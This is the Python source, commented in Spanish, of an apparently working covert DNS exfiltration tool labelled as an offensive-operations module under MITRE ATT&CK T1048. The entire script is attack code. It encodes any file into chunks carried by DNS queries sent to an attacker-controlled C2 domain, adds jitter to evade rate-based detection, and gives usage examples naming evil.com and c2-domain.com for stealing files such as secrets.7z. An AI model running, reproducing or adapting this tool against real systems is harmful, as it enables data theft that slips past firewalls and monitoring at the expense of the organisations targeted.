#!/usr/bin/env python3
#
# 🛡️ C4ISR-STRATCOM: SIGINT-V5
# [CLASSIFIED]: CONFIDENCIAL
# [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
# [TACTIC]: TA0010_Exfiltration
# [TECHNIQUE]: T1048_Exfiltration_Over_Alternative_Protocol
#
# ============================================================================
# SIGV5 — Covert DNS Exfiltration Tunnel
# ============================================================================
# Canal de exfiltración covert sobre DNS (UDP/53).
# Capacidades:
#   - Exfiltración a través de resolvers locales (bypass firewall restrictivo)
#   - Fragmentación automática de payloads grandes en chunks < 63 bytes (RFC)
#   - Codificación Base32 (case-insensitive, dominio-safe) o Hex
#   - Control de flujo simple con números de secuencia
#   - Soporte para registros TXT (respuesta) o CNAME/A (one-way)
#
# Uso:
#   python3 sigv5_t1048_dns_exfil_tunnel.py --file /tmp/.system_cache --domain evil.com --server 8.8.8.8
# ============================================================================

import argparse
import base64
import os
import random
import socket
import struct
import sys
import time
from typing import List, Optional

# ============================================================================
# DNS PROTOCOL HELPERS
# ============================================================================

class DNSMessage:
    """Constructor y parser simple de paquetes DNS."""
    
    @staticmethod
    def build_query(domain: str, qtype: int = 1) -> bytes:  # 1 = A, 16 = TXT
        # Header
        txn_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query, Recursion desired
        qdcount = 1
        ancount = 0
        nscount = 0
        arcount = 0
        
        header = struct.pack("!HHHHHH", txn_id, flags, qdcount, ancount, nscount, arcount)
        
        # Question
        qname = b""
        for part in domain.split("."):
            if part:
                qname += struct.pack("B", len(part)) + part.encode("ascii")
        qname += b"\x00"
        
        qclass = 1  # IN
        question = qname + struct.pack("!HH", qtype, qclass)
        
        return header + question


# ============================================================================
# EXFILTRATION LOGIC
# ============================================================================

class DNSExfiltrator:
    
    def __init__(self, target_domain: str, dns_server: Optional[str] = None, 
                 delay: float = 0.5, strategy: str = "b32"):
        self.target_domain = target_domain
        self.dns_server = dns_server
        self.delay = delay
        self.strategy = strategy
        self.session_id = f"{random.randint(0, 0xFFFF):04x}"
        self.total_chunks = 0
        self.sent_chunks = 0
        self.bytes_sent = 0

    def encode_payload(self, data: bytes) -> str:
        """Codifica los datos en ASCII seguro para nombres de dominio."""
        if self.strategy == "b32":
            # Base32 no usa caracteres especiales (solo A-Z y 2-7)
            # Removemos el padding para ahorrar espacio
            return base64.b32encode(data).decode('ascii').replace("=", "").lower()
        elif self.strategy == "hex":
            return data.hex()
        return data.hex()

    def chunk_data(self, data: bytes, chunk_size: int = 24) -> List[str]:
        """Divide los datos, y los codifica asegurando no pasar 63 chars por label."""
        # 24 bytes en b32 son ~39 chars, dejando espacio para metadata
        chunks = []
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            encoded = self.encode_payload(chunk)
            chunks.append(encoded)
        self.total_chunks = len(chunks)
        return chunks

    def format_query_domain(self, chunk_data: str, seq_num: int) -> str:
        """Formatea el FQDN para la query: <session>.<seq>.<tot>.<data>.dominio.com"""
        # RFC 1035: Label length < 63 characters
        # Truncate si por alguna razón nos pasamos (no deberia pasar con chunk_size 24)
        if len(chunk_data) > 60:
            chunk_data = chunk_data[:60]
            
        fqdn = f"{self.session_id}.{seq_num:04x}.{self.total_chunks:04x}.{chunk_data}.{self.target_domain}"
        return fqdn

    def send_dns_query(self, domain: str) -> bool:
        """Envía el paquete DNS UDP al servidor."""
        try:
            query = DNSMessage.build_query(domain, qtype=1)  # A record query es la más stealth
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)
            
            # Si no hay servidor específico, usa la resolución del SO (bypass firewall local)
            if self.dns_server:
                sock.sendto(query, (self.dns_server, 53))
                # Intentamos recibir para ver si respondió (no verificamos contenido)
                try:
                    sock.recvfrom(512)
                except socket.timeout:
                    pass
            else:
                # Usa la librería resolver del sistema
                try:
                    socket.gethostbyname(domain)
                except socket.gaierror:
                    # El dominio no existe (obvio, es nuestro tunnel data), pero el paquete salió
                    pass
            
            sock.close()
            return True
        except Exception:
            return False

    def start_exfiltration(self, filepath: str):
        if not os.path.exists(filepath):
            print(f"[!] File not found: {filepath}")
            return

        file_size = os.path.getsize(filepath)
        print("=" * 72)
        print("  SIGV5 — Covert DNS Exfiltration")
        print("=" * 72)
        print(f"  Target File:  {filepath} ({file_size} bytes)")
        print(f"  Destination:  *.{self.target_domain}")
        print(f"  DNS Server:   {self.dns_server if self.dns_server else 'System Default (OS Resolver)'}")
        print(f"  Session ID:   {self.session_id}")
        print("=" * 72)

        start_time = time.time()
        
        with open(filepath, "rb") as f:
            raw_data = f.read()

        # Enviar paquete de inicio (metadata del archivo)
        filename_b32 = self.encode_payload(os.path.basename(filepath).encode())
        init_domain = f"{self.session_id}.init.{filename_b32}.{self.target_domain}"
        print(f"[*] Sending INIT packet...")
        self.send_dns_query(init_domain)
        time.sleep(self.delay)

        # Chunkear y enviar payload
        chunks = self.chunk_data(raw_data)
        print(f"[*] Payload divided into {self.total_chunks} chunks.")
        
        for i, chunk in enumerate(chunks):
            # seq_num es 1-based para el C2
            domain = self.format_query_domain(chunk, i + 1)
            
            if i % 10 == 0 or i == self.total_chunks - 1:
                sys.stdout.write(f"\r[*] Progress: {i+1}/{self.total_chunks} chunks ({(i+1)/self.total_chunks*100:.1f}%)")
                sys.stdout.flush()
                
            self.send_dns_query(domain)
            self.sent_chunks += 1
            self.bytes_sent += len(chunk)
            
            # Evitar DoS al DNS y evadir detección de rate-anomalous
            # Agregamos ligero jitter al delay
            jitter = random.uniform(-0.1, 0.2)
            time.sleep(max(0.1, self.delay + jitter))

        print("\n\n[*] Sending EOF packet...")
        eof_domain = f"{self.session_id}.eof.done.{self.target_domain}"
        self.send_dns_query(eof_domain)

        elapsed = time.time() - start_time
        print("=" * 72)
        print(f"  EXFILTRATION COMPLETE")
        print(f"  Time Elapsed: {elapsed:.2f} seconds")
        print(f"  Total Queries: {self.sent_chunks + 2}")
        print("=" * 72)


def main():
    parser = argparse.ArgumentParser(
        description="SIGV5 Covert DNS Exfiltration Tool — T1048",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --file secrets.7z --domain c2-domain.com
  %(prog)s --file document.pdf --domain c2-domain.com --server 8.8.8.8 --delay 1.5
        """
    )
    parser.add_argument("--file", "-f", required=True, help="File to exfiltrate")
    parser.add_argument("--domain", "-d", required=True, help="Authoritative C2 domain for exfil zone")
    parser.add_argument("--server", "-s", default=None, help="Specific DNS server to query (default: OS resolver)")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between queries in seconds (default: 0.5)")
    parser.add_argument("--encoding", choices=["b32", "hex"], default="b32", help="Encoding strategy for the payload")

    args = parser.parse_args()

    exfiltrator = DNSExfiltrator(
        target_domain=args.domain,
        dns_server=args.server,
        delay=args.delay,
        strategy=args.encoding
    )
    
    exfiltrator.start_exfiltration(args.file)

if __name__ == "__main__":
    main()
